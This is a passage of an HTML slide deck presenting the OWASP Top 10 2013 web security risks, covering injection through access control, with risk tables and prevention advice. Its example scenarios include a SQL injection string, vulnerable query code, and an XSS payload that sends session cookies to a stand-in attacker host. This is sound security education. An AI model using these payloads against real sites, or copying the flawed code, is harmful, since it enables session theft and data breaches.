@@ -1,0 +1,1124 @@
+<!doctype html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+
+  <title>OWASP Top 10 2013</title>
+
+  <meta name="description" content="Open Web Application Security Projektin Top 10 riskilista. T10 2013 julkaistaan 2013">
+  <meta name="author" content="Petri Sirkkala">
+
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
+
+  <link rel="stylesheet" href="css/reveal.css">
+  <!--<link rel="stylesheet" href="css/theme/black.css" id="theme">-->
+  <link rel="stylesheet" href="css/theme/simple.css" id="theme">
+    <link rel="stylesheet" type="text/css" href="css/oma.css">
+
+  <!-- Code syntax highlighting -->
+  <link rel="stylesheet" href="lib/css/zenburn.css">
+
+  <!-- Printing and PDF exports -->
+  <script>
+    var link = document.createElement( 'link' );
+    link.rel = 'stylesheet';
+    link.type = 'text/css';
+    link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
+    document.getElementsByTagName( 'head' )[0].appendChild( link );
+  </script>
+
+  <!--[if lt IE 9]>
+  <script src="lib/js/html5shiv.js"></script>
+  <![endif]-->
+  </head>
+
+  <body>
+
+    <div class="reveal">
+
+      <!-- Any section element inside of this container is displayed as a slide -->
+      <div class="slides">
+
+
+
+
+
+
+
+
+        <section class="first">
+          <div class="author-box">
+            <div class="author">
+              <p>PETRI SIRKKALA</p>
+              <p>+358 44 339 8668</p>
+              <p>
+                <a href="mailto:petri.sirkkala@solita.fi">petri.sirkkala@solita.fi</a>
+              </p>
+            </div>
+          </div>
+          <h1>OWASP Top 10 2013</h1>
+          <h3>17.6.2014</h3>
+        </section>
+
+        <section>
+          <section>
+            <h2>
+              OWASP Top 10 2013
+            </h2>
+            <div>
+              Open Web Application Security Projektin Top 10 riskilista vuodelta 2013.
+            </div>
+            <div>
+              <a href="https://www.owasp.org/index.php/Top_10_2013">www.owasp.org/index.php/Top_10_2013</a>
+            </div>
+          </section>
+        </section>
+        <section>
+          <div>
+            <p>Riski muodostuu hyökkääjästä, hyökkäyspolusta ja hyökkäyksen aiheuttamasta bisneshaitasta</p>
+          </div>
+          <div>
+            <img src="img/Top_10_2013-appsec-risks.png" style="width: 60em;">
+          </div>
+        </section>
+        <section>
+          <section>
+            <h2>A1-Injection</h2>
+            <div class="owasp">
+              <table class="owasp-table">
+                <tbody>
+                  <tr class="heading">
+                    <th width="16.5%"> Threat Agents</th>
+                    <th width="16.5%"> Attack Vectors</th>
+                    <th width="33%" colspan="2"> Security Weakness</th>
+                    <th width="16.5%"> Technical Impacts</th>
+                    <th width="16.5%"> Business Impacts</th>
+                  </tr>
+                  <tr>
+                    <td class="owasp-none">&nbsp;? </td>
+                    <td class="owasp-high" width="16.5%">
+                      <b>Exploitability<br> EASY</b>
+                    </td>
+                    <td class="owasp-medium" width="16.5%">
+                      <b>Prevalence<br> COMMON</b>
+                    </td>
+                    <td class="owasp-medium" width="16.5%">
+                      <b>Detectability<br> AVERAGE</b>
+                    </td>
+                    <td class="owasp-high" width="16.5%">
+                      <b>Impact<br> SEVERE</b>
+                    </td>
+                    <td class="owasp-none">&nbsp;? </td>
+                  </tr>
+                  <tr valign="top">
+                    <td class="owasp-body">Consider anyone who can send untrusted data to the system, including external users, internal users, and administrators.
+                    </td>
+                    <td class="owasp-body">Attacker sends simple text-based attacks that exploit the syntax of the targeted interpreter. Almost any source of data can be an injection vector, including internal sources.
+                    </td>
+                    <td colspan="2" class="owasp-body">
+                      <a rel="nofollow" class="external text" href="http://www.owasp.org/index.php/Injection_Flaws">Injection flaws</a> occur when an application sends untrusted data to an interpreter. Injection flaws are very prevalent, particularly in legacy code.  They are often found in SQL, LDAP, Xpath, or NoSQL queries; OS commands; XML parsers, SMTP Headers, program arguments, etc. Injection flaws are easy to discover when examining code, but frequently hard to discover via testing. Scanners and fuzzers can help attackers find injection flaws.
+                    </td>
+                    <td class="owasp-body">Injection can result in data loss or corruption, lack of accountability, or denial of access. Injection can sometimes lead to complete host takeover.
+                    </td>
+                    <td class="owasp-body">Consider the business value of the affected data and the platform running the interpreter. All data could be stolen, modified, or deleted.  Could your reputation be harmed?
+                    </td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </section>
+          <section>
+            <h2>
+              Am I Vulnerable To 'Injection'?
+            </h2>
+
+            <ul>
+              <li>
+                Separate untrusted data from the command or query
+                <p>
+                  <small>- SQL: bind variables in all prepared statements</small>
+                </p>
+              </li>
+              <li>Checking the code to see if the application uses interpreters safely.</li>
+              <li>Code analysis tools</li>
+              <li>Penetration testers</li>
+            </ul>
+            <br>
+            <small>Poor error handling makes injection flaws easier to discover.</small>
+          </section>
+          <section>
+
+            <h2>How Do I prevent 'Injection'?</h2>
+            <p>Keep untrusted data separate from commands and queries.</p>
+
+            <ol>
+              <li> Use a safe API.</li>
+              <li> If a parameterized API is not available, you should carefully escape special characters</li>
+              <li> “White list” input validation with appropriate canonicalization.</li>
+            </ol>
+
+          </section>
+          <section>
+            <h2>Example Scenarios</h2>
+            <pre>
+              <code data-trim contenteditable>
+                String query = "SELECT * FROM accounts WHERE custID='" +
+                request.getParameter("id") +"'";
+              </code>
+            </pre>
+            <pre>
+              <code data-trim contenteditable>
+                http://example.com/app/accountView?id=' or '1'='1
+              </code>
+            </pre>
+            <small>This changes the meaning of the query to return all the records from the accounts table.  More dangerous attacks could modify data or even invoke stored procedures.</small>
+          </section>
+        </section>
+        <section>
+          <section>
+            <h2>A2-Broken Authentication and Session Management</h2>
+            <div class="owasp">
+              <table class="owasp-table">
+                <tbody>
+                  <tr class="heading">
+                    <th width="16.5%"> Threat Agents</th>
+                    <th width="16.5%"> Attack Vectors</th>
+                    <th width="33%" colspan="2"> Security Weakness</th>
+                    <th width="16.5%"> Technical Impacts</th>
+                    <th width="16.5%"> Business Impacts</th>
+                  </tr>
+                  <tr>
+                    <td class="owasp-none">&nbsp;? </td>
+                    <td class="owasp-medium" width="16.5%">
+                      <b>Exploitability<br> AVERAGE</b>
+                    </td>
+                    <td class="owasp-high" width="16.5%">
+                      <b>Prevalence<br> WIDESPREAD</b>
+                    </td>
+                    <td class="owasp-medium" width="16.5%">
+                      <b>Detectability<br> AVERAGE</b>
+                    </td>
+                    <td class="owasp-high" width="16.5%">
+                      <b>Impact<br> SEVERE</b>
+                    </td>
+                    <td class="owasp-none">&nbsp;? </td>
+                  </tr>
+                  <tr valign="top">
+                    <td class="owasp-body">Consider anonymous external attackers, as well as users with their own accounts, who may attempt to steal accounts from others. Also consider insiders wanting to disguise their actions.
+                    </td>
+                    <td class="owasp-body">Attacker uses leaks or flaws in the authentication or session management functions (e.g., exposed accounts, passwords, session IDs) to impersonate users.
+                    </td>
+                    <td colspan="2" class="owasp-body">Developers frequently build custom authentication and session management schemes, but building these correctly is hard. As a result, these custom schemes frequently have flaws in areas such as logout, password management, timeouts, remember me, secret question, account update, etc. Finding such flaws can sometimes be difficult, as each implementation is unique.
+                    </td>
+                    <td class="owasp-body">Such flaws may allow some or even <u>all</u> accounts to be attacked. Once successful, the attacker can do anything the victim could do. Privileged accounts are frequently targeted.
+                    </td>
+                    <td class="owasp-body">Consider the business value of the affected data or application functions.
+                      <p>Also consider the business impact of public exposure of the vulnerability.
+                      </p>
+                    </td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </section>
+          <section>
+            <div class="squeeze">
+              <h2>Am I Vulnerable To 'Broken Authentication and Session Management'?</h2>
+              <p>The primary assets to protect are credentials and session IDs.
+              </p>
+              <ol>
+                <li> Are credentials always protected when stored using hashing or encryption? See A6.
+                </li>
+                <li> Can credentials be guessed or overwritten through weak account management functions (e.g., account creation, change password, recover password, weak session IDs)?
+                </li>
+                <li> Are session IDs exposed in the URL (e.g., URL rewriting)?
+                </li>
+                <li> Are session IDs vulnerable to <a rel="nofollow" class="external text" href="https://www.owasp.org/index.php/Session_fixation">session fixation</a> attacks?
+                </li>
+                <li> Do session IDs timeout and can users log out?
+                </li>
+                <li> Are session IDs rotated after successful login?
+                </li>
+                <li> Are passwords, session IDs, and other credentials sent only over TLS connections? See <a rel="nofollow" class="external text" href="https://www.owasp.org/index.php/Top_10_2013-A6" title="Top 10 2013-A6" class="mw-redirect"> A6</a>.
+                </li>
+              </ol>
+              <p>See the <a rel="nofollow" class="external text" href="https://www.owasp.org/index.php/ASVS">ASVS</a> requirement areas V2 and V3 for more details.
+              </p>
+            </div>
+          </section>
+          <section>
+            <div class="squeeze">
+              <h2>How Do I prevent 'Broken Authentication and Session Management'?</h2>
+              <p>The primary recommendation for an organization is to make available to developers:
+              </p>
+              <ol>
+                <li> <b>A single set of strong authentication and session management controls.</b> Such controls should strive to:
+                  <ul>
+                    <li> meet all the authentication and session management requirements defined in OWASP’s <a rel="nofollow" class="external text" href="https://www.owasp.org/index.php/ASVS">Application Security Verification Standard</a> (ASVS) areas V2 (Authentication) and V3 (Session Management).
+                    </li>
+                    <li> have a simple interface for developers. Consider the <a rel="nofollow" class="external text" href="http://owasp-esapi-java.googlecode.com/svn/trunk_doc/latest/org/owasp/esapi/Authenticator.html">ESAPI Authenticator and User APIs</a> as good examples to emulate, use, or build upon.
+                    </li>
+                  </ul>
+                </li>
+                <li> Strong efforts should also be made to avoid XSS flaws which can be used to steal session IDs. See A3.
+                </li>
+              </ol>
+            </div>
+          </section>
+        </section>
+        <section>
+          <section>
+            <h2>A3-Cross-Site Scripting (XSS)</h2>
+            <div class="owasp">
+              <table class="owasp-table">
+                <tbody>
+                  <tr class="heading">
+                    <th width="16.5%"> Threat Agents</th>
+                    <th width="16.5%"> Attack Vectors</th>
+                    <th width="33%" colspan="2"> Security Weakness</th>
+                    <th width="16.5%"> Technical Impacts</th>
+                    <th width="16.5%"> Business Impacts</th>
+                  </tr>
+                  <tr>
+                    <td class="owasp-none">&nbsp;? </td>
+                    <td class="owasp-medium" width="16.5%">
+                      <b>Exploitability<br> AVERAGE</b>
+                    </td>
+                    <td class="owasp-very-high" width="16.5%">
+                      <b>Prevalence<br> VERY WIDESPREAD</b>
+                    </td>
+                    <td class="owasp-high" width="16.5%">
+                      <b>Detectability<br> EASY</b>
+                    </td>
+                    <td class="owasp-medium" width="16.5%">
+                      <b>Impact<br> MODERATE</b>
+                    </td>
+                    <td class="owasp-none">&nbsp;? </td>
+                  </tr>
+                  <tr valign="top">
+                    <td class="owasp-body">Consider anyone who can send untrusted data to the system, including external users, internal users, and administrators.</td>
+                    <td class="owasp-body">Attacker sends text-based attack scripts that exploit the interpreter in the browser. Almost any source of data can be an attack vector, including internal sources such as data from the database.
+                    </td>
+                    <td colspan="2" class="owasp-body">
+                      <p>
+                        <a rel="nofollow" class="external text" href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)" title="Cross-site Scripting (XSS)"> XSS</a> is the most prevalent web application security flaw. XSS flaws occur when an application includes user supplied data in a page sent to the browser without properly validating or escaping that content. There are two different types of XSS flaws: 1) <a rel="nofollow" class="external text" href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)" title="Cross-site Scripting (XSS)"> Stored</a> and 2) <a rel="nofollow" class="external text" href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)" title="Cross-site Scripting (XSS)"> Reflected</a>, and each of these can occur on the a) <a rel="nofollow" class="external text" href="https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting#Server_XSS" title="Types of Cross-Site Scripting"> Server </a> or b) on the <a rel="nofollow" class="external text" href="https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting#Client_XSS" title="Types of Cross-Site Scripting"> Client</a>.
+                      </p>
+
+                      <p>Detection of most Server XSS flaws is fairly easy via testing or code analysis. Client XSS is very difficult to identify.
+                      </p>
+                    </td>
+                    <td class="owasp-body">Attackers can execute scripts in a victim’s browser to hijack user sessions, deface web sites, insert hostile content, redirect users, hijack the user’s browser using malware, etc.
+                    </td>
+                    <td class="owasp-body">Consider the business value of the affected system and all the data it processes.
+                      <p>Also consider the business impact of public exposure of the vulnerability.
+                      </p>
+                    </td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </section>
+          <section>
+            <div class="squeeze">
+              <h2>Am I Vulnerable To 'Cross-Site Scripting (XSS)'?</h2>
+              <ul>
+                <li>Ensure that all user supplied input sent back to the browser is properly escaped before it is included in the output page
+                </li>
+                <li>If AJAX is being used to dynamically update the page, you should try to use safe <a rel="nofollow" class="external text" href="https://www.owasp.org/images/c/c5/Unraveling_some_Mysteries_around_DOM-based_XSS.pdf">safe JavaScript APIs</a>.
+                </li>
+                <li>Automated tools can find some XSS problems automatically. JavaScript, ActiveX, Flash, and Silverlight, makes automated detection difficult. Complete coverage requires a combination of manual code review and pen testing, in addition to automated approaches.
+                </li>
+              </ul>
+            </div>
+          </section>
+          <section>
+            <div class="squeeze">
+              <h2>How Do I prevent 'Cross-Site Scripting (XSS)'?</h2>
+              <p>How Do I Prevent XSS?
+                Preventing XSS requires keeping untrusted data separate from active browser content.
+              </p>
+              <ol>
+                <li> Escape all untrusted data based on the HTML context (body, attribute, JavaScript, CSS, or URL) that the data will be placed into.
+                </li>
+                <li> Positive or “whitelist” input validation.
+                </li>
+                <li> For rich content, consider auto-sanitization libraries like OWASP's <a rel="nofollow" class="external text" href="https://www.owasp.org/index.php/AntiSamy" title="AntiSamy" class="mw-redirect">AntiSamy</a> or the <a rel="nofollow" class="external text" href="https://www.owasp.org/index.php/OWASP_Java_HTML_Sanitizer_Project" title="OWASP Java HTML Sanitizer Project"> Java HTML Sanitizer Project</a>.
+                </li>
+                <li> Consider <a rel="nofollow" class="external text" href="https://www.owasp.org/index.php/Content_Security_Policy" title="Content Security Policy">Content Security Policy</a> (CSP) to defend against XSS across your entire site.
+                </li>
+              </ol>
+            </div>
+          </section>
+          <section>
+            <div class="squeeze">
+              <h2>Example Scenarios</h2>
+              <p>The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:
+              </p>
+              <pre>
+                <code data-trim contenteditable>
+                  (String) page += "&lt;input name='creditcard' type='TEXT'"
+                  + "value='" + request.getParameter("CC") + "'&gt;";
+                </code>
+              </pre>
+              <p>The attacker modifies the 'CC' parameter in their browser to:
+              </p>
+              <pre>
+                <code data-trim contenteditable>
+                  '&gt;&lt;script&gt;document.location='<a rel="nofollow" class="external free" <br>
+                  href="http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie">http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</a>&lt;/script&gt;'
+                </code>
+              </pre>
+              <p>This causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.
+                Note that attackers can also use XSS to defeat any  automated CSRF defense the application might employ. See A8 for info on CSRF.
+                Detection of most XSS flaws is fairly easy via testing or code analysis.
+              </p>
+            </div>
+          </section>
+        </section>
+        <section>
+          <section>
+            <h2>A4-Insecure Direct Object References</h2>
+            <div class="owasp">
+              <table class="owasp-table">
+                <tbody>
+                  <tr class="heading">
+                    <th width="16.5%"> Threat Agents</th>
+                    <th width="16.5%"> Attack Vectors</th>
+                    <th width="33%" colspan="2"> Security Weakness</th>
+                    <th width="16.5%"> Technical Impacts</th>
+                    <th width="16.5%"> Business Impacts</th>
+                  </tr>
+                  <tr>
+                    <td class="owasp-none">&nbsp;? </td>
+                    <td class="owasp-high" width="16.5%">
+                      <b>Exploitability<br> EASY</b>
+                    </td>
+                    <td class="owasp-medium" width="16.5%">
+                      <b>Prevalence<br> COMMON</b>
+                    </td>
+                    <td class="owasp-high" width="16.5%">
+                      <b>Detectability<br> EASY</b>
+                    </td>
+                    <td class="owasp-medium" width="16.5%">
+                      <b>Impact<br> MODERATE</b>
+                    </td>
+                    <td class="owasp-none">&nbsp;? </td>
+                  </tr>
+                  <tr valign="top">
+                    <td class="owasp-body">Consider the types of users of your system. Do any users have only partial access to certain types of system data?
+                    </td>
+                    <td class="owasp-body">Attacker, who is an authorized system user, simply changes a parameter value that directly refers to a system object to another object the user isn’t authorized for. Is access granted?
+                    </td>
+                    <td colspan="2" class="owasp-body">Applications frequently use the actual name or key of an object when generating web pages. Applications don’t always verify the user is authorized for the target object. This results in an insecure direct object reference flaw. Testers can easily manipulate parameter values to detect such flaws and code analysis quickly shows whether authorization is properly verified.
+                    </td>
+                    <td class="owasp-body">Such flaws can compromise all the data that can be referenced by the parameter. Unless the name space is sparse, it’s easy for an attacker to access all available data of that type.
+                    </td>
+                    <td class="owasp-body">Consider the business value of the exposed data.
+                      <p>Also consider the business impact of public exposure of the vulnerability.
+                      </p>
+                    </td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </section>
+          <section>
+            <div class="squeeze">
+              <h2>Am I Vulnerable To 'Insecure Direct Object References'?</h2>
+              <p>Verify that all object references have appropriate defenses. To achieve this, consider:
+              </p>
+              <ol>
+                <li> For direct references to restricted resources, the application needs to verify the user is authorized to access the exact resource they have requested.
+                </li>
+                <li> If the reference is an indirect reference, the mapping to the direct reference must be limited to values authorized for the current user.
+                </li>
+              </ol>
+              <br>
+              <br>
+              <p>Code review of the application can quickly verify whether either approach is implemented safely. Testing is also effective for identifying direct object references and whether they are safe. Automated tools typically do not look for such flaws because they cannot recognize what requires protection or what is safe or unsafe.
+              </p>
+            </div>
+          </section>
+          <section>
+            <div class="squeeze">
+              <h2>How Do I prevent 'Insecure Direct Object References'?</h2>
+              <p>Select an approach for protecting each user accessible object (e.g., object number, filename):
+              </p>
+              <ol>
+                <li> Use per user or session indirect object references. This prevents attackers from directly targeting unauthorized resources. For example, instead of using the resource’s database key, a drop down list of six resources authorized for the current user could use the numbers 1 to 6 to indicate which value the user selected. The application has to map the per-user indirect reference back to the actual database key on the server. OWASP’s <a rel="nofollow" class="external text" href="https://www.owasp.org/index.php/ESAPI">ESAPI</a> includes both sequential and random access reference maps that developers can use to eliminate direct object references.
+                </li>
+                <li> Check access. Each use of a direct object reference from an untrusted source must include an access control check to ensure the user is authorized for the requested object.
+                </li>
+              </ol>
+            </div>
+          </section>
+          <section>
+            <div class="squeeze">
+              <h2>Example Scenarios</h2>
+              <p>The application uses unverified data in a SQL call that is accessing account information:
+              </p>
+              <pre>
+                <code data-trim contenteditable>
+                  String query = "SELECT * FROM accts WHERE account = ?";
+                  PreparedStatement pstmt = connection.prepareStatement(query , … );
+
+                  {{red|pstmt.setString( 1, request.getParameter("acct"));}}
+
+                  ResultSet results = pstmt.executeQuery( );
+                </code>
+              </pre>
+              <p>The attacker simply modifies the ‘acct’ parameter in their browser to send whatever account number they want. If not verified, the attacker can access any user’s account, instead of only the intended customer’s account.
+              </p>
+              <pre>
+                <code data-trim contenteditable>
+                  http://example.com/app/accountInfo?acct=notmyacct
+                </code>
+              </pre>
+            </div>
+          </section>
+        </section>
+        <section>
+          <section>
+            <h2>A5-Security Misconfiguration</h2>
+            <div class="owasp">
+              <table class="owasp-table">
+                <tbody>
+                  <tr class="heading">
+                    <th width="16.5%"> Threat Agents</th>
+                    <th width="16.5%"> Attack Vectors</th>
+                    <th width="33%" colspan="2"> Security Weakness</th>
+                    <th width="16.5%"> Technical Impacts</th>
+                    <th width="16.5%"> Business Impacts</th>
+                  </tr>
+                  <tr>
+                    <td class="owasp-none">&nbsp;? </td>
+                    <td class="owasp-high" width="16.5%">
+                      <b>Exploitability<br> EASY</b>
+                    </td>
+                    <td class="owasp-medium" width="16.5%">
+                      <b>Prevalence<br> COMMON</b>
+                    </td>
+                    <td class="owasp-high" width="16.5%">
+                      <b>Detectability<br> EASY</b>
+                    </td>
+                    <td class="owasp-medium" width="16.5%">
+                      <b>Impact<br> MODERATE</b>
+                    </td>
+                    <td class="owasp-none">&nbsp;? </td>
+                  </tr>
+                  <tr valign="top">
+                    <td class="owasp-body">Consider anonymous external attackers as well as users with their own accounts that may attempt to compromise the system. Also consider insiders wanting to disguise their actions.
+                    </td>
+                    <td class="owasp-body">Attacker accesses default accounts, unused pages, unpatched flaws, unprotected files and directories, etc. to gain unauthorized access to or knowledge of the system.
+                    </td>
+                    <td colspan="2" class="owasp-body">Security misconfiguration can happen at any level of an application stack, including the platform, web server, application server, framework, and custom code. Developers and network administrators need to work together to ensure that the entire stack is configured properly. Automated scanners are useful for detecting missing patches, misconfigurations, use of default accounts, unnecessary services, etc.
+                    </td>
+                    <td class="owasp-body">Such flaws frequently give attackers unauthorized access to some system data or functionality. Occasionally, such flaws result in a complete system compromise.
+                    </td>
+                    <td class="owasp-body">The system could be completely compromised without you knowing it. All your data could be stolen or modified slowly over time.
+                      Recovery costs could be expensive.
+                    </td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </section>
+          <section>
+            <div class="squeeze">
+              <h2>Am I Vulnerable To 'Security Misconfiguration'?</h2>
+              <p>Have you performed the proper security hardening across the entire application stack?
+              </p>
+              <ol>
+                <li>Do you have a process for keeping all your software up to date?<br>- OS, Web/App Server, DBMS, applications, and <b>all code libraries</b>.
+                </li>
+                <li>Is everything unnecessary disabled, removed, or not installed?<br>- ports, services, pages, accounts, privileges
+                </li>
+                <li>Are default account passwords changed or disabled?
+                </li>
+                <li>Is your error handling set up to prevent stack traces and other overly informative error messages from leaking?
+                </li>
+                <li>Are the security settings in your development frameworks and libraries understood and configured properly?
+                </li>
+              </ol>
+              <p>A concerted, repeatable process is required to develop and maintain a proper application security configuration.
+              </p>
+            </div>
+          </section>
+          <section>
+            <div class="squeeze">
+              <h2>Example Scenarios</h2>
+              <p>
+                <u>Scenario #1:</u> The app server admin console is automatically installed and not removed. Default accounts aren’t changed. Attacker discovers the standard admin pages are on your server, logs in with default passwords, and takes over.
+              </p>
+              <p>
+                <u>Scenario #2:</u> Directory listing is not disabled on your server. Attacker discovers she can simply list directories to find any file. Attacker finds and downloads all your compiled Java classes, which she reverses to get all your custom code. She then finds a serious access control flaw in your application.
+              </p>
+              <p>
+                <u>Scenario #3:</u> App server configuration allows stack traces to be returned to users, potentially exposing underlying flaws. Attackers love the extra information error messages provide.
+              </p>
+              <p>
+                <u>Scenario #4:</u> App server comes with sample applications that are not removed from your production server. Said sample applications have well known security flaws attackers can use to compromise your server.
+              </p>
+            </div>
+          </section>
+        </section>
+        <section>
+          <section>
+            <h2>A6-Sensitive Data Exposure</h2>
+            <div class="owasp">
+              <table class="owasp-table">
+                <tbody>
+                  <tr class="heading">
+                    <th width="16.5%"> Threat Agents</th>
+                    <th width="16.5%"> Attack Vectors</th>
+                    <th width="33%" colspan="2"> Security Weakness</th>
+                    <th width="16.5%"> Technical Impacts</th>
+                    <th width="16.5%"> Business Impacts</th>
+                  </tr>
+                  <tr>
+                    <td class="owasp-none">&nbsp;? </td>
+                    <td class="owasp-low" width="16.5%">
+                      <b>Exploitability<br> DIFFICULT</b>
+                    </td>
+                    <td class="owasp-low" width="16.5%">
+                      <b>Prevalence<br> UNCOMMON</b>
+                    </td>
+                    <td class="owasp-medium" width="16.5%">
+                      <b>Detectability<br> AVERAGE</b>
+                    </td>
+                    <td class="owasp-high" width="16.5%">
+                      <b>Impact<br> SEVERE</b>
+                    </td>
+                    <td class="owasp-none">&nbsp;? </td>
+                  </tr>
+                  <tr valign="top">
+                    <td class="owasp-body">Consider who can gain access to your sensitive data and any backups of that data. This includes the data at rest, in transit, and even in your customers’ browsers. Include both external and internal threats.
+                    </td>
+                    <td class="owasp-body">Attackers typically don’t break crypto directly. They break something else, such as steal keys, do a man-in-the-middle attack, steal clear text data off the server, steal it in transit, or right from the browser.
+                    </td>
+                    <td colspan="2" class="owasp-body">The most common flaw is simply not encrypting sensitive data. When crypto is employed, weak key generation and management, and weak algorithm usage is common, particularly weak hashing solutions to protect passwords. Browser weaknesses are very common and easy to detect, but hard to exploit. External attackers have difficulty detecting most of these types of flaws due to limited access and they are also usually hard to exploit.
+                    </td>
+                    <td class="owasp-body">Failure frequently compromises all data that should have been protected. Typically this information includes  sensitive data such as health records, credentials, personal data, credit cards, etc.
+                    </td>
+                    <td class="owasp-body">Consider the business value of the lost data and impact to your reputation. What is your legal liability if this data is exposed? Also consider the damage to your reputation.
+                    </td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </section>
+          <section>
+            <div class="squeeze">
+              <h2>Am I Vulnerable To 'Sensitive Data Exposure'?</h2>
+              <p>Determine which data is sensitive enough to require extra protection. For example, passwords, credit card numbers, health records, and personal information. For all such data, ensure:
+              </p>
+              <ol>
+                <li> It is encrypted everywhere it is stored long term, including backups of this data.
+                </li>
+                <li> It is encrypted in transit, ideally internally as well as externally. All internet traffic should be encrypted.
+                </li>
+                <li> Strong encryption algorithms are used for all crypto.
+                </li>
+                <li> Strong crypto keys are generated, and proper key management is in place, <b>including key rotation</b>.
+                </li>
+                <li> Proper browser directives and headers are set to protect sensitive data provided by or sent to the browser.
+                </li>
+              </ol>
+              <small>And more … For a more complete set of problems to avoid, see <a rel="nofollow" class="external text" href="https://www.owasp.org/index.php/ASVS">ASVS areas Crypto (V7), Data Prot. (V9), and SSL (V10)</a>
+              </small>
+            </div>
+          </section>
+          <section>
+            <div class="squeeze">
+              <h2>How Do I prevent 'Sensitive Data Exposure'?</h2>
+              <p>At a minimum:
+              </p>
+              <ol>
+                <li> Considering the threats you plan to protect this data from (e.g., insider attack, external user), make sure you encrypt all sensitive data at rest and in transit in a manner that defends against these threats.
+                </li>
+                <li> Don’t store sensitive data unnecessarily. Discard it as soon as possible. Data you don’t have can’t be stolen.
+                </li>
+                <li> Ensure strong standard algorithms and strong keys are used, and proper key management is in place.
+                </li>
+
+                <li> Disable autocomplete on forms collecting sensitive data and disable caching for pages displaying sensitive data.
+                </li>
+              </ol>
+
+              <p>Ensure passwords are stored with an algorithm specifically designed for password protection, such as <a rel="nofollow" class="external text" href="http://en.wikipedia.org/wiki/Bcrypt">bcrypt</a>, <a rel="nofollow" class="external text" href="http://en.wikipedia.org/wiki/PBKDF2">PBKDF2</a>, or <a rel="nofollow" class="external text" href="http://en.wikipedia.org/wiki/Scrypt">scrypt</a>.
+              </p>
+
+            </div>
+          </section>
+          <section>
+            <div class="squeeze">
+              <h2>Example Scenarios</h2>
+              <p>
+                <u>Scenario #1:</u> An application encrypts credit card numbers in a database using automatic database encryption. However, this means it also decrypts this data automatically when retrieved, allowing an SQL injection flaw to retrieve credit card numbers in clear text. The system should have encrypted the credit card numbers using a public key, and only allowed back-end applications to decrypt them with the private key.
+              </p>
+              <p>
+                <u>Scenario #2:</u> A site simply doesn't use SSL for all authenticated pages. Attacker simply monitors network traffic (like an open wireless network), and steals the user’s session cookie. Attacker then replays this cookie and hijacks the user’s session, accessing all their private data.
+              </p>
+              <p>
+                <u>Scenario #3:</u> The password database uses unsalted hashes to store everyone’s passwords. A file upload flaw allows an attacker to retrieve the password file. All the unsalted hashes can be exposed with a rainbow table of precalculated hashes.
+              </p>
+            </div>
+          </section>
+        </section>
+        <section>
+          <section>
+            <h2>A7-Missing Function Level Access Control</h2>
+            <div class="owasp">
+              <table class="owasp-table">
+                <tbody>
+                  <tr class="heading">
+                    <th width="16.5%"> Threat Agents</th>
+                    <th width="16.5%"> Attack Vectors</th>
+                    <th width="33%" colspan="2"> Security Weakness</th>
+                    <th width="16.5%"> Technical Impacts</th>
+                    <th width="16.5%"> Business Impacts</th>
+                  </tr>
+                  <tr>
+                    <td class="owasp-none">&nbsp;? </td>
+                    <td class="owasp-high" width="16.5%">
+                      <b>Exploitability<br> EASY</b>
+                    </td>
+                    <td class="owasp-medium" width="16.5%">
+                      <b>Prevalence<br> COMMON</b>
+                    </td>
+                    <td class="owasp-medium" width="16.5%">
+                      <b>Detectability<br> AVERAGE</b>
+                    </td>
+                    <td class="owasp-medium" width="16.5%">
+                      <b>Impact<br> MODERATE</b>
+                    </td>
+                    <td class="owasp-none">&nbsp;? </td>
+                  </tr>
+                  <tr valign="top">
+                    <td class="owasp-body">Anyone with network access can send your application a request. Could anonymous users access private functionality or regular users a privileged function?
+                    </td>
+                    <td class="owasp-body">Attacker, who is an authorized system user, simply changes the URL or a parameter to a privileged function. Is access granted? Anonymous users could access private functions that aren’t protected.
+                    </td>
+                    <td colspan="2" class="owasp-body">Applications do not always protect application functions properly. Sometimes, function level protection is managed via configuration, and the system is misconfigured. Sometimes, developers must include the proper code checks, and they forget.
+                      <p>Detecting such flaws is easy. The hardest part is identifying which pages (URLs) or functions exist to attack.
+                      </p>
+                    </td>
+                    <td class="owasp-body">Such flaws allow attackers to access unauthorized functionality. Administrative functions are key targets for this type of attack.
+                    </td>
+                    <td class="owasp-body">Consider the business value of the exposed functions and the data they process.
+                      <p>Also consider the impact to your reputation if this vulnerability became public.
+                      </p>
+                    </td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </section>
+          <section>
+            <div class="squeeze">
+              <h2>Am I Vulnerable To 'Missing Function Level Access Control'?</h2>
+              <p>Verify every application function:
+              </p>
+              <ol>
+                <li> Does the UI show navigation to unauthorized functions?
+                </li>
+                <li> Are proper authentication and authorization checked?
+                </li>
+                <li> Are checks done on the server without relying on information provided by the attacker?
+                </li>
+              </ol>
+              <p>Using a proxy, browse your application with a privileged role. Then revisit restricted pages while logged in as a less privileged role. Some proxies support this type of analysis.
+              </p>
+              <p>Code review control implementation in the code. Try following a single privileged request through the code and verifying the authorization pattern. Then search to ensure that the pattern is followed throughout.
+              </p>
+              <small>Automated tools are unlikely to find these problems.
+              </small>
+            </div>
+          </section>
+          <section>
+            <div class="squeeze">
+              <h2>How Do I prevent 'Missing Function Level Access Control'?</h2>
+              <p>Your application should have a consistent and easily analyzable authorization module that is invoked from all your business functions.
+              </p>
+              <ol>
+                <li> Think about the process for managing entitlements and ensure you can update and audit easily. Don’t hard code.
